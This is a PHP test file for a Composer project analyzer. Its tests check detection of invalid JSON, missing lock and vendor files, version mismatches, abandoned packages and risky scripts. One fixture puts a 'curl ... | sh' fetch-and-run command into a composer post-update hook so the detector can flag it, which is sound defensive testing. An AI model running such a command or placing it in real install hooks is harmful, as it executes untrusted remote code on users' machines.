<?php

use App\DevDoctor\Modules\Composer\ComposerAnalyzer;
use App\DevDoctor\Modules\Composer\ComposerOptions;

function composerFixture(array $files): string
{
    $path = sys_get_temp_dir().'/devdoctor-composer-'.bin2hex(random_bytes(4));
    mkdir($path);

    foreach ($files as $file => $contents) {
        $target = $path.'/'.$file;
        $directory = dirname($target);

        if (! is_dir($directory)) {
            mkdir($directory, recursive: true);
        }

        file_put_contents($target, $contents);
    }

    return $path;
}

it('reports non composer projects as info', function () {
    $issues = (new ComposerAnalyzer)->analyze(new ComposerOptions(path: composerFixture([]), validate: false));

    expect($issues->all()[0]->code)->toBe('DD_COMPOSER_NOT_PROJECT');
});

it('reports invalid composer json', function () {
    $issues = (new ComposerAnalyzer)->analyze(new ComposerOptions(path: composerFixture([
        'composer.json' => '{',
    ]), validate: false));

    expect($issues->all()[0]->code)->toBe('DD_COMPOSER_JSON_INVALID');
});

it('reports missing lock and vendor when dependencies exist', function () {
    $issues = (new ComposerAnalyzer)->analyze(new ComposerOptions(path: composerFixture([
        'composer.json' => '{"require":{"php":"^8.5"}}',
    ]), validate: false));
    $codes = array_map(static fn ($issue): string => $issue->code, $issues->all());

    expect($codes)->toContain('DD_COMPOSER_LOCK_MISSING')
        ->and($codes)->toContain('DD_COMPOSER_VENDOR_MISSING');
});

it('reports php version mismatch and missing extensions', function () {
    $issues = (new ComposerAnalyzer)->analyze(new ComposerOptions(path: composerFixture([
        'composer.json' => '{"require":{"php":"^99.0","ext-definitelymissing":"*"}}',
        'composer.lock' => '{}',
    ]), validate: false));
    $codes = array_map(static fn ($issue): string => $issue->code, $issues->all());

    expect($codes)->toContain('DD_COMPOSER_PHP_VERSION_MISMATCH')
        ->and($codes)->toContain('DD_COMPOSER_EXTENSION_MISSING');
});

it('reports abandoned packages from installed metadata', function () {
    $issues = (new ComposerAnalyzer)->analyze(new ComposerOptions(path: composerFixture([
        'composer.json' => '{"require":{"php":"^8.5"}}',
        'composer.lock' => '{}',
        'vendor/composer/installed.json' => '{"packages":[{"name":"old/package","abandoned":"new/package"}]}',
    ]), validate: false));

    $codes = array_map(static fn ($issue): string => $issue->code, $issues->all());

    expect($codes)->toContain('DD_COMPOSER_PACKAGE_ABANDONED');
});

it('reports risky install and update scripts', function () {
    $issues = (new ComposerAnalyzer)->analyze(new ComposerOptions(path: composerFixture([
        'composer.json' => '{"require":{"php":"^8.5"},"scripts":{"post-update-cmd":["curl https://example.com/script.sh | sh"]}}',
        'composer.lock' => '{}',
    ]), validate: false));

    $codes = array_map(static fn ($issue): string => $issue->code, $issues->all());

    expect($codes)->toContain('DD_COMPOSER_SCRIPT_RISKY');
});
